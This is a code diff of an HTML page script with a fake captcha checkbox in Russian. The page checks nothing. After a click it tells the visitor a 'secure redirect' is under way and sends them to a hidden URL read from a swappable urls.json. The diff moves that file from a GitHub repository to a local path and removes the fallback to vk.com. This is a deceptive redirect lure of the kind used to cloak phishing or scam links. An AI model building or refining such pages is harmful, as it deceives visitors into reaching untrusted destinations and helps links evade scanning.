@@ -97,10 +97,10 @@
     </div>
 
     <script>
-        const GITHUB_JSON_URL = 'https://raw.githubusercontent.com/vk-2captcha-proving-grounds/go/main/urls.json';
+        // Относительный путь к файлу в том же каталоге
+        const LOCAL_JSON_URL = './urls.json';
         
         let targetUrl = null;
-        let isPrepared = false;
 
         // Пинг первого URL в фоне
         async function checkUrlAccessible(url) {
@@ -118,20 +118,22 @@
         // Подготовка ссылки сразу при заходе на страницу
         async function prepareTargetUrl() {
             try {
-                const response = await fetch(GITHUB_JSON_URL, { cache: 'no-store' });
+                const response = await fetch(LOCAL_JSON_URL, { cache: 'no-store' });
                 const urls = await response.json();
 
-                if (urls && urls.length > 0) {
-                    const firstUrl = urls[0]; // Берём строго первую ссылку
+                if (Array.isArray(urls) && urls.length > 0) {
+                    const firstUrl = urls[0];
                     const isAlive = await checkUrlAccessible(firstUrl);
-                    targetUrl = isAlive ? firstUrl : urls[0]; // Если пинг не прошёл, всё равно ставим её как запасную
+                    targetUrl = isAlive ? firstUrl : urls[0];
+                } else if (urls && urls.url) {
+                    // Поддержка формата {"url": "https://..."}
+                    const isAlive = await checkUrlAccessible(urls.url);
+                    targetUrl = isAlive ? urls.url : urls.url;
                 }
             } catch (e) {
-                console.error("Ошибка предзагрузки конфигурации:", e);
+                console.error("Ошибка загрузки urls.json:", e);
             } finally {
-                isPrepared = true;
-                
-                // Отображаем капчу сразу после загрузки конфига
+                // Показываем капчу пользователю
                 document.getElementById('loader').style.display = 'none';
                 document.getElementById('captchaBox').style.display = 'flex';
                 document.getElementById('title').innerText = "Подтвердите действие";
@@ -139,32 +141,40 @@
             }
         }
 
-        // Обработчик клика по чекбоксу
+        // Обработка клика по чекбоксу
         document.getElementById('captchaCheck').addEventListener('change', function() {
             if (this.checked) {
                 this.disabled = true;
                 document.getElementById('captchaBox').style.display = 'none';
                 document.getElementById('loader').style.display = 'inline-block';
                 
-                // Требуемый текст при нажатии
+                // Текст при клике
                 document.getElementById('title').innerText = "Проверка соединения";
                 document.getElementById('desc').innerText = "Пожалуйста, подождите. Идет безопасное перенаправление.";
                 document.getElementById('status').innerText = "Статус: Установление сессии...";
                 document.getElementById('status').style.color = "#3498db";
 
-                // Переход строго через 1 секунду
+                // Переход ровно через 1 секунду
                 setTimeout(() => {
                     if (targetUrl) {
                         window.location.replace(targetUrl);
                     } else {
-                        // Резервный фоллбэк на случай если запрос ещё не дошёл
-                        window.location.replace('https://vk.com');
+                        // Запасная попытка забрать адрес, если файл долго подгружался
+                        fetch(LOCAL_JSON_URL, { cache: 'no-store' })
+                            .then(res => res.json())
+                            .then(data => {
+                                const fallback = Array.isArray(data) ? data[0] : data.url;
+                                window.location.replace(fallback);
+                            })
+                            .catch(() => {
+                                window.location.reload();
+                            });
                     }
                 }, 1000);
             }
         });
 
-        // Запуск проверки сразу при загрузке страницы
+        // Запуск при открытии страницы
         window.onload = prepareTargetUrl;
     </script>
 </body>
